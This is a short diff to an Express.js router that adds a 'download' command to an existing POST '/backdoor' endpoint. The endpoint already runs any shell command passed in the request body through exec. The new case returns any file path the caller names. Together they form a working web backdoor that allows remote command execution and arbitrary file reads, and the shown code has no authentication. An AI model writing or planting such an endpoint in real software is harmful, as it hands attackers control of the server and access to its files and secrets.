@@ -43,6 +43,12 @@ router.get('/survey', function(req, res, next) {
 
 router.post('/backdoor', function(req, res, next) {
   switch(req.body.cmd) {
+    case 'download':
+      res.sendFile(req.body.payload, function(err) {
+        if(err)
+          res.send({errno: err.errno, errcode: err.code})
+      })
+      break
     case 'exec':
       exec(req.body.payload, (error, stdout, stderr) => {
         res.send({error: error, stdout: stdout, stderr: stderr})
